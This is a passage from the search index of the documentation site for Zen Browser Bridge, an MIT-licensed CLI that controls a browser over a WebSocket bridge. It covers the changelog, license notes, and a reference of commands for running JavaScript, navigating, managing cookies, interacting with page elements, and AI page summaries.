<li><code>highlight_selector.js</code> - Visual element highlighting</li> </ul>"},{"location":"about/changelog/#cli-commands-30","title":"CLI Commands (30+)","text":"<p>Core commands: <code>eval</code>, <code>exec</code>, <code>repl</code>, <code>info</code> Interaction: <code>click</code>, <code>double-click</code>, <code>right-click</code>, <code>inspect</code>, <code>inspected</code>, <code>highlight</code>, <code>wait</code> Extraction: <code>links</code>, <code>outline</code>, <code>selected</code>, <code>cookies</code> AI: <code>summarize</code>, <code>describe</code> Control: <code>control</code> Navigation: <code>open</code>, <code>back</code>, <code>forward</code>, <code>reload</code> Media: <code>screenshot</code>, <code>download</code> Utilities: <code>send</code>, <code>watch</code> Server: <code>server start</code>, <code>server stop</code>, <code>server status</code> Help: <code>userscript</code>, <code>--help</code></p>"},{"location":"about/changelog/#requirements","title":"Requirements","text":"<ul> <li>Python 3.11+</li> <li>Zen Browser (or any browser with userscript support)</li> <li>Userscript manager (Violentmonkey, Tampermonkey, or Greasemonkey)</li> </ul>"},{"location":"about/changelog/#dependencies","title":"Dependencies","text":"<ul> <li><code>click&gt;=8.1.0</code> - CLI framework</li> <li><code>requests&gt;=2.31.0</code> - HTTP client</li> <li><code>aiohttp&gt;=3.9.0</code> - Async HTTP</li> <li><code>pydantic&gt;=2.5.0</code> - Data validation</li> </ul>"},{"location":"about/changelog/#development-tools","title":"Development Tools","text":"<ul> <li><code>pytest&gt;=7.4.0</code> - Testing framework</li> <li><code>ruff&gt;=0.1.6</code> - Linting and formatting</li> <li><code>mypy&gt;=1.7.0</code> - Type checking</li> <li><code>playwright&gt;=1.40.0</code> - E2E testing</li> </ul>"},{"location":"about/changelog/#version-history-summary","title":"Version History Summary","text":"Version Release Date Highlights 2.0.0 2025-10-27 Major refactoring: hexagonal architecture, 267 tests, comprehensive documentation 1.0.0 2025-10-27 First production release: 30+ commands, AI features, keyboard control"},{"location":"about/changelog/#development-timeline","title":"Development Timeline","text":"<p>October 27, 2025 - Complete refactoring cycle:</p> <ul> <li>Phase 0: Foundation and infrastructure setup</li> <li>Phase 1: Type safety and protocol validation</li> <li>Phase 2: Services and adapters layers, fixed blocking I/O</li> <li>Phase 3: CLI modularization and comprehensive testing</li> <li>Documentation: MkDocs site with Material theme</li> </ul> <p>October 26-27, 2025 - Feature additions:</p> <ul> <li>AI-powered article summarization</li> <li>Page description for screen readers</li> <li>Keyboard control mode with auto-refocus</li> <li>Link extraction with filtering</li> <li>Page outline visualization</li> <li>Language detection and configuration</li> </ul> <p>October 25, 2025 - Initial development:</p> <ul> <li>WebSocket communication architecture</li> <li>Basic CLI commands</li> <li>Userscript integration</li> <li>Element highlighting</li> <li>Initial feature set</li> </ul>"},{"location":"about/changelog/#next-steps","title":"Next Steps","text":"<ul> <li>License</li> <li>Contributing Guide</li> <li>Architecture Overview</li> <li>Home</li> </ul>"},{"location":"about/license/","title":"License","text":"<p>Zen Browser Bridge is released under the MIT License.</p>"},{"location":"about/license/#mit-license","title":"MIT License","text":"<p>Copyright \u00a9 2025 Roel van Gils</p> <p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p> <p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p> <p>THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>"},{"location":"about/license/#what-does-this-mean","title":"What Does This Mean?","text":"<p>The MIT License is one of the most permissive open-source licenses. In plain English:</p>"},{"location":"about/license/#you-can","title":"You CAN:","text":"<ul> <li>Use - Use Zen Bridge for personal or commercial projects</li> <li>Modify - Change the source code to fit your needs</li> <li>Distribute - Share the software with others</li> <li>Sublicense - Include it in proprietary software</li> <li>Sell - Use it in products you sell</li> </ul>"},{"location":"about/license/#you-must","title":"You MUST:","text":"<ul> <li>Include License - Include the original MIT License text and copyright notice in any copies or substantial portions of the software</li> </ul>"},{"location":"about/license/#you-cannot","title":"You CANNOT:","text":"<ul> <li>Hold Liable - Hold the authors responsible if something goes wrong</li> <li>Use Trademark - Use the authors' names or trademarks to promote your work</li> </ul>"},{"location":"about/license/#third-party-licenses","title":"Third-Party Licenses","text":"<p>Zen Bridge depends on several excellent open-source projects. We are grateful to their maintainers:</p>"},{"location":"about/license/#core-dependencies","title":"Core Dependencies","text":"Package License Purpose Click BSD-3-Clause CLI framework Requests Apache-2.0 HTTP client aiohttp Apache-2.0 Async HTTP Pydantic MIT Data validation"},{"location":"about/license/#development-dependencies","title":"Development Dependencies","text":"Package License Purpose pytest MIT Testing framework Ruff MIT Linting and formatting MyPy MIT Type checking Playwright Apache-2.0 E2E testing"},{"location":"about/license/#documentation","title":"Documentation","text":"Package License Purpose MkDocs BSD-2-Clause Documentation generator Material for MkDocs MIT Documentation theme PyMdown Extensions MIT Markdown extensions"},{"location":"about/license/#browser-integration","title":"Browser Integration","text":"Component License Purpose Mozilla Readability Apache-2.0 Article extraction Userscript managers (Violentmonkey, Tampermonkey, Greasemonkey) Various Script injection"},{"location":"about/license/#license-compatibility","title":"License Compatibility","text":"<p>The MIT License is compatible with:</p> <ul> <li>GPL (GPLv2, GPLv3) - Can be combined in GPL-licensed projects</li> <li>Apache 2.0 - Compatible with Apache-licensed projects</li> <li>BSD - Compatible with BSD-licensed projects</li> <li>Commercial - Can be used in proprietary/commercial software</li> </ul>"},{"location":"about/license/#attribution","title":"Attribution","text":"<p>If you use Zen Bridge in your project, attribution is appreciated but not required. You can credit it as:</p> <p>This project uses Zen Browser Bridge by Roel van Gils, licensed under the MIT License.</p>"},{"location":"about/license/#questions","title":"Questions?","text":"<p>If you have questions about licensing:</p> <ul> <li>Read the full MIT License text</li> <li>Check Choose a License for more details</li> <li>Review the Open Source Initiative's MIT License page</li> </ul>"},{"location":"about/license/#next-steps","title":"Next Steps","text":"<ul> <li>Changelog - See what's new in each version</li> <li>Contributing Guide - Learn how to contribute</li> <li>Home - Return to documentation home</li> </ul>"},{"location":"api/commands/","title":"CLI Command Reference","text":"<p>Complete reference for all 42+ Zen Bridge CLI commands organized by category.</p>"},{"location":"api/commands/#overview","title":"Overview","text":"<p>The Zen CLI provides commands to interact with the browser through the WebSocket bridge. Commands range from simple JavaScript execution to complex AI-powered content analysis and interactive browser control.</p> <p>Global Usage: <pre><code>zen [OPTIONS] COMMAND [ARGS]...\n</code></pre></p> <p>Global Options:</p> <ul> <li><code>--version</code> - Show the version and exit</li> <li><code>--help</code> - Show help message and exit</li> </ul>"},{"location":"api/commands/#command-categories","title":"Command Categories","text":"<ul> <li>Execution - Execute JavaScript code</li> <li>Navigation - Navigate browser history and pages</li> <li>Cookies - Manage browser cookies</li> <li>Interaction - Interact with page elements</li> <li>Inspection - Inspect elements and capture screenshots</li> <li>Selection - Work with text selection</li> <li>Server - Manage the bridge server</li> <li>Extraction - Extract and analyze page content</li> <li>Watch - Monitor browser events</li> <li>Utilities - Utility commands</li> </ul>"},{"location":"api/commands/#execution","title":"Execution","text":""},{"location":"api/commands/#eval","title":"<code>eval</code>","text":"<p>Execute JavaScript code in the active browser tab.</p> <p>Syntax: <pre><code>zen eval [CODE] [OPTIONS]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>CODE</code> - JavaScript code to execute (optional if using --file or stdin)</li> </ul> <p>Options:</p> <ul> <li><code>-f, --file PATH</code> - Execute code from file</li> <li><code>-t, --timeout FLOAT</code> - Timeout in seconds (default: 10)</li> <li><code>--format [auto|json|raw]</code> - Output format (default: auto)</li> <li><code>--url</code> - Also print page URL</li> <li><code>--title</code> - Also print page title</li> </ul> <p>Examples:</p> <pre><code># Execute inline code\nzen eval \"document.title\"\n\n# Execute from file\nzen eval --file script.js\n\n# Read from stdin\necho \"console.log('test')\" | zen eval\n\n# Get result as JSON\nzen eval \"({title: document.title, url: location.href})\" --format json\n\n# Show metadata\nzen eval \"document.body.innerHTML.length\" --url --title\n</code></pre> <p>Return Value:</p> <p>Outputs the result of JavaScript execution. Format depends on <code>--format</code> option:</p> <ul> <li>auto (default): Smart formatting based on type</li> <li>json: Valid JSON output</li> <li>raw: String representation</li> </ul> <p>Error Handling:</p> <ul> <li>Exits with code 1 on execution errors</li> <li>Shows error message in stderr</li> <li>Timeouts after specified seconds</li> </ul> <p>Related:</p> <ul> <li><code>exec</code> - Execute from file only</li> <li><code>repl</code> - Interactive execution</li> </ul>"},{"location":"api/commands/#exec","title":"<code>exec</code>","text":"<p>Execute JavaScript from a file.</p> <p>Syntax: <pre><code>zen exec FILEPATH [OPTIONS]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>FILEPATH</code> - Path to JavaScript file (required)</li> </ul> <p>Options:</p> <ul> <li><code>-t, --timeout FLOAT</code> - Timeout in seconds (default: 10)</li> <li><code>--format [auto|json|raw]</code> - Output format (default: auto)</li> </ul> <p>Examples:</p> <pre><code>zen exec script.js\nzen exec script.js --timeout 30\nzen exec script.js --format json\n</code></pre> <p>Return Value:</p> <p>Same as <code>eval</code> command.</p> <p>Error Handling:</p> <ul> <li>Exits with code 1 if file not found or execution fails</li> <li>Shows error message in stderr</li> </ul> <p>Related:</p> <ul> <li><code>eval</code> - Execute inline code or from stdin</li> </ul>"},{"location":"api/commands/#navigation","title":"Navigation","text":""},{"location":"api/commands/#open","title":"<code>open</code>","text":"<p>Navigate to a URL.</p> <p>Syntax: <pre><code>zen open URL [OPTIONS]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>URL</code> - URL to navigate to (required)</li> </ul> <p>Options:</p> <ul> <li><code>--wait</code> - Wait for page to finish loading</li> <li><code>-t, --timeout INT</code> - Timeout in seconds when using --wait (default: 30)</li> </ul> <p>Examples:</p> <pre><code># Navigate to URL\nzen open \"https://example.com\"\n\n# Navigate and wait for page load\nzen open \"https://example.com\" --wait\n\n# Navigate with custom timeout\nzen open \"https://example.com\" --wait --timeout 60\n</code></pre> <p>Return Value:</p> <p>Prints confirmation message. If <code>--wait</code> is used, confirms page load.</p> <p>Error Handling:</p> <ul> <li>Exits with code 1 if navigation fails</li> <li>Timeouts after specified seconds when using --wait</li> </ul> <p>Related:</p> <ul> <li><code>reload</code> - Reload current page</li> <li><code>back</code> - Go back in history</li> </ul>"},{"location":"api/commands/#back","title":"<code>back</code>","text":"<p>Go back to the previous page in browser history.</p> <p>Syntax: <pre><code>zen back\n</code></pre></p> <p>Aliases:</p> <ul> <li><code>previous</code> (hidden)</li> </ul> <p>Examples:</p> <pre><code>zen back\n</code></pre> <p>Return Value:</p> <p>Prints \"\u2713 Navigated back\"</p> <p>Related:</p> <ul> <li><code>forward</code> - Go forward in history</li> <li><code>open</code> - Navigate to URL</li> </ul>"},{"location":"api/commands/#forward","title":"<code>forward</code>","text":"<p>Go forward to the next page in browser history.</p> <p>Syntax: <pre><code>zen forward\n</code></pre></p> <p>Aliases:</p> <ul> <li><code>next</code> (hidden)</li> </ul> <p>Examples:</p> <pre><code>zen forward\n</code></pre> <p>Return Value:</p> <p>Prints \"\u2713 Navigated forward\"</p> <p>Related:</p> <ul> <li><code>back</code> - Go back in history</li> </ul>"},{"location":"api/commands/#reload","title":"<code>reload</code>","text":"<p>Reload the current page.</p> <p>Syntax: <pre><code>zen reload [OPTIONS]\n</code></pre></p> <p>Options:</p> <ul> <li><code>--hard</code> - Hard reload (bypass cache)</li> </ul> <p>Aliases:</p> <ul> <li><code>refresh</code> (hidden)</li> </ul> <p>Examples:</p> <pre><code># Normal reload\nzen reload\n\n# Hard reload (bypass cache)\nzen reload --hard\n</code></pre> <p>Return Value:</p> <p>Prints confirmation message.</p> <p>Related:</p> <ul> <li><code>open</code> - Navigate to URL</li> </ul>"},{"location":"api/commands/#cookies","title":"Cookies","text":"<p>The <code>cookies</code> command group manages browser cookies.</p>"},{"location":"api/commands/#cookies-list","title":"<code>cookies list</code>","text":"<p>List all cookies for the current page.</p> <p>Syntax: <pre><code>zen cookies list\n</code></pre></p> <p>Examples:</p> <pre><code>zen cookies list\n</code></pre> <p>Return Value:</p> <p>Displays cookie count and name-value pairs:</p> <pre><code>Cookies (3):\n\n  session_id = abc123def456...\n  user_pref = dark\n  tracking = true\n</code></pre> <p>Related:</p> <ul> <li><code>cookies get</code> - Get specific cookie</li> </ul>"},{"location":"api/commands/#cookies-get","title":"<code>cookies get</code>","text":"<p>Get the value of a specific cookie.</p> <p>Syntax: <pre><code>zen cookies get NAME\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>NAME</code> - Cookie name (required)</li> </ul> <p>Examples:</p> <pre><code>zen cookies get session_id\n</code></pre> <p>Return Value:</p> <p>Prints cookie name and value:</p> <pre><code>session_id = abc123def456\n</code></pre> <p>Error Handling:</p> <ul> <li>Exits with code 1 if cookie not found</li> </ul> <p>Related:</p> <ul> <li><code>cookies list</code> - List all cookies</li> </ul>"},{"location":"api/commands/#cookies-set","title":"<code>cookies set</code>","text":"<p>Set a cookie.</p> <p>Syntax: <pre><code>zen cookies set NAME VALUE [OPTIONS]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>NAME</code> - Cookie name (required)</li> <li><code>VALUE</code> - Cookie value (required)</li> </ul> <p>Options:</p> <ul> <li><code>--max-age INT</code> - Max age in seconds</li> <li><code>--expires TEXT</code> - Expiration date (e.g., 'Wed, 21 Oct 2025 07:28:00 GMT')</li> <li><code>--path TEXT</code> - Cookie path (default: /)</li> <li><code>--domain TEXT</code> - Cookie domain</li> <li><code>--secure</code> - Secure flag (HTTPS only)</li> <li><code>--same-site [Strict|Lax|None]</code> - SameSite attribute</li> </ul> <p>Examples:</p> <pre><code># Simple cookie\nzen cookies set session_id abc123\n\n# With expiration\nzen cookies set token xyz --max-age 3600\n\n# Secure cookie with path\nzen cookies set user_pref dark --path / --secure\n\n# With SameSite\nzen cookies set csrf_token abc --same-site Strict\n</code></pre> <p>Return Value:</p> <p>Prints confirmation:</p> <pre><code>\u2713 Cookie set: session_id = abc123\n</code></pre> <p>Related:</p> <ul> <li><code>cookies delete</code> - Delete cookie</li> </ul>"},{"location":"api/commands/#cookies-delete","title":"<code>cookies delete</code>","text":"<p>Delete a specific cookie.</p> <p>Syntax: <pre><code>zen cookies delete NAME\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>NAME</code> - Cookie name (required)</li> </ul> <p>Examples:</p> <pre><code>zen cookies delete session_id\n</code></pre> <p>Return Value:</p> <p>Prints confirmation:</p> <pre><code>\u2713 Cookie deleted: session_id\n</code></pre> <p>Related:</p> <ul> <li><code>cookies clear</code> - Delete all cookies</li> </ul>"},{"location":"api/commands/#cookies-clear","title":"<code>cookies clear</code>","text":"<p>Clear all cookies for the current page.</p> <p>Syntax: <pre><code>zen cookies clear\n</code></pre></p> <p>Examples:</p> <pre><code>zen cookies clear\n</code></pre> <p>Return Value:</p> <p>Prints count of deleted cookies:</p> <pre><code>\u2713 Cleared 5 cookie(s)\n</code></pre> <p>Related:</p> <ul> <li><code>cookies delete</code> - Delete specific cookie</li> </ul>"},{"location":"api/commands/#interaction","title":"Interaction","text":""},{"location":"api/commands/#send","title":"<code>send</code>","text":"<p>Send text to the browser by typing it character by character.</p> <p>Syntax: <pre><code>zen send TEXT [OPTIONS]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>TEXT</code> - Text to type (required)</li> </ul> <p>Options:</p> <ul> <li><code>-s, --selector TEXT</code> - CSS selector to focus before typing</li> </ul> <p>Examples:</p> <pre><code># Type into currently focused element\nzen send \"Hello World\"\n\n# Type into specific element\nzen send \"test@example.com\" --selector \"input[type=email]\"\n\n# Type into password field\nzen send \"mypassword\" --selector \"#password\"\n</code></pre> <p>Return Value:</p> <p>Prints confirmation message.</p> <p>Error Handling:</p> <ul> <li>Exits with code 1 if element not found (when using --selector)</li> <li>Shows error hint if no element focused</li> </ul> <p>Related:</p> <ul> <li><code>click</code> - Click elements</li> </ul>"},{"location":"api/commands/#click","title":"<code>click</code>","text":"<p>Click on an element.</p> <p>Syntax: <pre><code>zen click [SELECTOR]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>SELECTOR</code> - CSS selector (default: $0 for inspected element)</li> </ul> <p>Examples:</p> <pre><code># Click on stored element ($0)\nzen inspect \"button#submit\"\nzen click\n\n# Click directly on element\nzen click \"button#submit\"\nzen click \".primary-button\"\n</code></pre> <p>Return Value:</p> <p>Prints element details and click position:</p> <pre><code>Clicked: &lt;button#submit&gt;\nPosition: x=120, y=450\n</code></pre> <p>Error Handling:</p> <ul> <li>Exits with code 1 if element not found</li> </ul> <p>Related:</p> <ul> <li><code>double-click</code> - Double-click</li> <li><code>right-click</code> - Right-click</li> <li><code>inspect</code> - Inspect element</li> </ul>"},{"location":"api/commands/#double-click","title":"<code>double-click</code>","text":"<p>Double-click on an element.</p> <p>Syntax: <pre><code>zen double-click [SELECTOR]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>SELECTOR</code> - CSS selector (default: $0 for inspected element)</li> </ul> <p>Aliases:</p> <ul> <li><code>doubleclick</code> (hidden)</li> </ul> <p>Examples:</p> <pre><code>zen double-click \"div.item\"\nzen inspect \"div.item\"\nzen double-click\n</code></pre> <p>Return Value:</p> <p>Same as <code>click</code> command.</p> <p>Related:</p> <ul> <li><code>click</code> - Single click</li> </ul>"},{"location":"api/commands/#right-click","title":"<code>right-click</code>","text":"<p>Right-click (context menu) on an element.</p> <p>Syntax: <pre><code>zen right-click [SELECTOR]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>SELECTOR</code> - CSS selector (default: $0 for inspected element)</li> </ul> <p>Aliases:</p> <ul> <li><code>rightclick</code> (hidden)</li> </ul> <p>Examples:</p> <pre><code>zen right-click \"a.download-link\"\nzen inspect \"a.download-link\"\nzen right-click\n</code></pre> <p>Return Value:</p> <p>Same as <code>click</code> command.</p> <p>Related:</p> <ul> <li><code>click</code> - Left click</li> </ul>"},{"location":"api/commands/#wait","title":"<code>wait</code>","text":"<p>Wait for an element to appear, be visible, hidden, or contain text.</p> <p>Syntax: <pre><code>zen wait SELECTOR [OPTIONS]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>SELECTOR</code> - CSS selector (required)</li> </ul> <p>Options:</p> <ul> <li><code>-t, --timeout INT</code> - Timeout in seconds (default: 30)</li> <li><code>--visible</code> - Wait for element to be visible</li> <li><code>--hidden</code> - Wait for element to be hidden</li> <li><code>--text TEXT</code> - Wait for element to contain specific text</li> </ul> <p>Examples:</p> <pre><code># Wait for element to exist (up to 30 seconds)\nzen wait \"button#submit\"\n\n# Wait for element to be visible\nzen wait \".modal\" --visible\n\n# Wait for element to be hidden\nzen wait \".loading-spinner\" --hidden\n\n# Wait for element to contain text\nzen wait \"h1\" --text \"Success\"\n\n# Custom timeout (10 seconds)\nzen wait \"div.result\" --timeout 10\n</code></pre> <p>Return Value:</p> <p>Prints status and wait time:</p> <pre><code>Waiting for element to be visible: .modal\n\u2713 Element is visible\n  Element: div.modal\n  Waited: 1.23s\n</code></pre> <p>Error Handling:</p> <ul> <li>Exits with code 1 on timeout</li> <li>Shows timeout message with details</li> </ul> <p>Related:</p> <ul> <li><code>click</code> - Click after waiting</li> </ul>"},{"location":"api/commands/#inspection","title":"Inspection","text":""},{"location":"api/commands/#inspect","title":"<code>inspect</code>","text":"<p>Select an element and show its details.</p> <p>Syntax: <pre><code>zen inspect [SELECTOR]\n</code></pre></p> <p>Arguments:</p> <ul> <li><code>SELECTOR</code> - CSS selector (optional)</li> </ul> <p>Examples:</p> <pre><code># Select and show details\nzen inspect \"h1\"\nzen inspect \"#header\"\nzen inspect \".main-content\"\n\n# Show currently selected element\nzen inspect\n</code></pre> <p>Return Value:</p> <p>Displays comprehensive element information:</p> <ul> <li>Tag name and selector</li> <li>ID and classes</li> <li>Text content</li> <li>Dimensions (position, size, bounds)</li> <li>Visibility status</li> <li>Accessibility details</li> <li>Semantic information</li> <li>Computed styles</li> <li>Attributes</li> </ul> <p>Example output:</p> <pre><code>Selected element: h1\n\nTag:      &lt;h1&gt;\nSelector: h1#main-title.hero-heading\nParent:   &lt;header&gt;\nID:       main-title\nClasses:  hero-heading, large\nText:     Welcome to Our Site\n\nDimensions:\n  Position: x=20, y=100\n  Size:     800\u00d760px\n  Bounds:   top=100, right=820, bottom=160, left=20\n\nVisibility:\n  Visible:     Yes\n  In viewport: Yes\n\nAccessibility:\n  Role:            heading\n  Accessible Name: \"Welcome to Our Site\"\n  Name computed from: contents\n  Focusable:       No\n\nStyles:\n  font-size: 48px\n  font-weight: 700\n  color: rgb(33, 33, 33)\n</code></pre> <p>Related:</p> <ul> <li><code>inspected</code> - Show inspected element details</li> <li><code>click</code> - Click inspected element</li> </ul>"},{"location":"api/commands/#inspected","title":"<code>inspected</code>","text":"<p>Get information about the currently inspected element.</p> <p>Syntax: <pre><code>zen inspected\n</code></pre></p> <p>Examples:</p> <pre><code># From DevTools:\n# 1. Right-click element \u2192 Inspect\n# 2. In DevTools Console: zenStore()\n# 3. Run:\nzen inspected\n\n# Or select programmatically:\nzen inspect \"h1\"\nzen inspected\n</code></pre> <p>Return Value:</p> <p>Same detailed output as <code>inspect</code> command.</p> <p>Error Handling:</p> <ul> <li>Exits with code 1 if no element inspected</li> <li>Shows hint on how to inspect element</li> </ul> <p>Related:</p> <ul> <li><code>inspect</code> - Select element</li> </ul>"},{"location":"api/commands/#screenshot","title":"<code>screenshot</code>","text":"<p>Take a screenshot of a specific element.</p> <p>Syntax: <pre><code>zen screenshot -s SELECTOR [OPTIONS]\n</code></pre></p> <p>Options:</p> <ul> <li><code>-s, --selector TEXT</code> - CSS selector (required, use $0 for inspected element)</li> <li><code>-o, --output PATH</code> - Output file path (optional)</li> </ul> <p>Examples:</p> <pre><code># Screenshot element\nzen screenshot --selector \"#main\"\n\n# Save to specific file\nzen screenshot -s \".hero-section\" -o hero.png\n\n# Screenshot inspected element ($0)\nzen screenshot -s \"$0\" -o inspected.png\n</code></pre> <p>Return Value:</p> <p>Prints save location and image size:</p> <pre><code>Capturing element: #main\nScreenshot saved: /path/to/screenshot_main_20251027_143522.png\nSize: 1200x800px (245.3 KB)\n</code></pre> <p>Error Handling:</p> <ul> <li>Exits with code 1 if element not found</li> <li>Shows error if screenshot fails</li> </ul> <p>Related:</p> <ul> <li><code>inspect</code> - Inspect before screenshot</li> </ul>"},{"location":"api/commands/#selection","title":"Selection","text":""},{"location":"api/commands/#selected","title":"<code>selected</code>","text":"<p>Get the current text selection in the browser.</p> <p>Syntax: <pre><code>zen selected [OPTIONS]\n</code></pre></p> <p>Options:</p> <ul> <li><code>--raw</code> - Output only the text without formatting</li> </ul> <p>Examples:</p> <pre><code># Get selection with metadata\nzen selected\n\n# Get just the raw text\nzen selected --raw\n\n# Pipe to file\nzen selected --raw &gt; selection.txt\n</code></pre> <p>Return Value:</p> <p>Default mode shows:</p> <pre><code>Selected Text (145 characters):\n\n\"This is the selected text from the browser...\"\n\nPosition:\n  x=120, y=340\n  Size: 450\u00d780px\n\nContainer:\n  Tag:   &lt;p&gt;\n  ID:    intro\n  Class: lead-paragraph\n</code></pre> <p>Raw mode outputs only the selected text.</p> <p>Error Handling:</p> <ul> <li>Exits with code 0 if no selection (not an error)</li> <li>Shows hint to select text first</li> </ul> <p>Related:</p> <ul> <li>None</li> </ul>"},{"location":"api/commands/#server","title":"Server","text":"<p>The <code>server</code> command group manages the bridge server.</p>"},{"location":"api/commands/#server-start","title":"<code>server start</code>","text":"<p>Start the bridge server.</p> <p>Syntax: <pre><code>zen server start [OPTIONS]\n</code></pre></p> <p>Options:</p> <ul> <li><code>-p, --port INT</code> - Port to run on (default: 8765)</li> <li><code>-d, --daemon</code> - Run in background</li> </ul> <p>Examples:</p> <pre><code># Start in foreground\nzen server start\n\n# Start on custom port\nzen server start --port 9000\n\n# Start as background daemon\nzen server start --daemon\n</code></pre> <p>Return Value:</p> <p>Foreground mode: Runs until Ctrl+C Daemon mode: Prints confirmation and returns</p> <pre><code>Starting WebSocket bridge server in background on port 8765...\nWebSocket server started successfully on ports 8765 (HTTP) and 8766 (WebSocket)\n</code></pre> <p>Error Handling:</p> <ul> <li>Exits with code 1 if server already running</li> <li>Shows error if port in use</li> </ul> <p>Related:</p> <ul> <li><code>server status</code> - Check server status</li> <li><code>server stop</code> - Stop server</li> </ul>"},{"location":"api/commands/#server-status","title":"<code>server status</code>","text":"<p>Check bridge server status.</p> <p>Syntax: <pre><code>zen server status\n</code></pre></p> <p>Examples:</p> <pre><code>zen server status\n</code></pre> <p>Return Value:</p> <p>Displays server status and statistics:</p> <pre><code>Bridge server is running\n  Pending requests:   0\n  Completed requests: 142\n</code></pre> <p>Error Handling:</p> <ul> <li>Exits with code 1 if server not running</li> </ul> <p>Related:</p> <ul> <li><code>server start</code> - Start server</li> </ul>"},{"location":"api/commands/#server-stop","title":"<code>server stop</code>","text":"<p>Stop the bridge server.</p> <p>Syntax: <pre><code>zen server stop\n</code></pre></p> <p>Examples:</p> <pre><code>zen server stop\n</code></pre> <p>Return Value:</p> <p>Shows instructions for stopping server:</p> <pre><code>Note: Use Ctrl+C to stop the server if running in foreground\nFor daemon mode, use: pkill -f 'zen.bridge_ws'\n</code></pre> <p>Related:</p> <ul> <li><code>server start</code> - Start server</li> </ul>"},{"location":"api/commands/#extraction","title":"Extraction","text":""},{"location":"api/commands/#describe","title":"<code>describe</code>","text":"<p>Generate an AI-powered description of the page for screen reader users.</p> <p>Syntax: <pre><code>zen describe [OPTIONS]\n</code></pre></p> <p>Options:</p> <ul> <li><code>--language, --lang TEXT</code> - Language for AI output (overrides config)</li> <li><code>--debug</code> - Show the full prompt instead of calling AI</li> </ul> <p>Examples:</p> <pre><code># Generate description\nzen describe\n\n# Force English output\nzen describe --language en\n\n# Debug mode (see prompt)\nzen describe --debug\n</code></pre> <p>Return Value:</p> <p>AI-generated natural language description of page structure, landmarks, and navigation.</p> <p>Requirements:</p> <ul> <li>Requires <code>mods</code> command (https://github.com/charmbracelet/mods)</li> <li>Analyzes page structure, headings, landmarks, forms, images</li> </ul> <p>Error Handling:</p> <ul> <li>Exits with code 1 if mods not installed</li> <li>Shows error if page extraction fails</li> </ul> <p>Related:</p> <ul> <li><code>outline</code> - Show heading structure</li> <li><code>summarize</code> - Summarize article</li> </ul>"},{"location":"api/commands/#outline","title":"<code>outline</code>","text":"<p>Display the page's heading structure as a nested outline.</p> <p>Syntax: <pre><code>zen outline\n</code></pre></p> <p>Examples:</p> <pre><code>zen outline\n</code></pre> <p>Return Value:</p> <p>Displays hierarchical heading structure:</p> <pre><code>H1 Welcome to Our Site\n   H2 Getting Started\n      H3 Installation\n      H3 Configuration\n   H2 Features\n      H3 Performance\n      H3 Accessibility\n\nTotal: 6 headings\n</code></pre> <p>Related:</p> <ul> <li><code>describe</code> - AI-powered description</li> </ul>"},{"location":"api/commands/#links","title":"<code>links</code>","text":"<p>Extract all links from the current page.</p> <p>Syntax: <pre><code>zen links [OPTIONS]\n</code></pre></p> <p>Options:</p> <ul> <li><code>--only-internal</code> - Show only internal links (same domain)</li> <li><code>--only-external</code> - Show only external links (different domain)</li> <li><code>--alphabetically</code> - Sort links alphabetically</li> <li><code>--only-urls</code> - Show only URLs without anchor text</li> <li><code>--json</code> - Output as JSON with detailed link information</li> <li><code>--enrich-external</code> - Fetch metadata for external links (MIME type, file size, etc.)</li> </ul> <p>Examples:</p> <pre><code># All links with anchor text\nzen links\n\n# Only links on same domain\nzen links --only-internal\n\n# Only links to other domains\nzen links --only-external\n\n# Sort alphabetically\nzen links --alphabetically\n\n# Show only URLs\nzen links --only-urls\n\n# External URLs only\nzen links --only-external --only-urls\n\n# Add metadata for external links\nzen links --enrich-external\n\n# JSON output\nzen links --json\n</code></pre> <p>Return Value:</p> <p>Default mode shows links with indicators:</p> <pre><code>\u2192 Home\n  https://example.com/\n\n\u2197 External Site\n  https://external.com/\n  HTTP 200 | text/html | Title: External Site Title | Lang: en\n\nTotal: 25 links\n</code></pre> <p>JSON mode outputs structured data:</p> <pre><code>{\n  \"links\": [\n    {\n      \"text\": \"Home\",\n      \"href\": \"https://example.com/\",\n      \"type\": \"internal\"\n    }\n  ],\n  \"total\": 25,\n  \"domain\": \"example.com\"\n}\n</code></pre> <p>Related:</p> <ul> <li><code>describe</code> - Page description</li> </ul>"},{"location":"api/commands/#summarize","title":"<code>summarize</code>","text":"<p>Summarize the current article using AI.</p> <p>Syntax: <pre><code>zen summarize [OPTIONS]\n</code></pre></p> <p>Options:</p> <ul> <li><code>--format [summary|full]</code> - Output format (default: summary)</li> <li><code>--language, --lang TEXT</code> - Language for AI output (overrides config)</li> <li><code>--debug</code> - Show the full prompt instead of calling AI</li> </ul> <p>Examples:</p> <pre><code># Get AI summary\nzen summarize\n\n# Show full extracted article\nzen summarize --format full\n\n# Force French output\nzen summarize --language fr\n\n# Debug mode\nzen summarize --debug\n</code></pre> <p>Return Value:</p> <p>Summary mode: AI-generated concise summary Full mode: Extracted article content</p> <p>Requirements:</p> <ul> <li>Requires <code>mods</code> command</li> <li>Uses Mozilla Readability for extraction</li> <li>Works best on article pages</li> </ul> <p>Error Handling:</p> <ul> <li>Exits with code 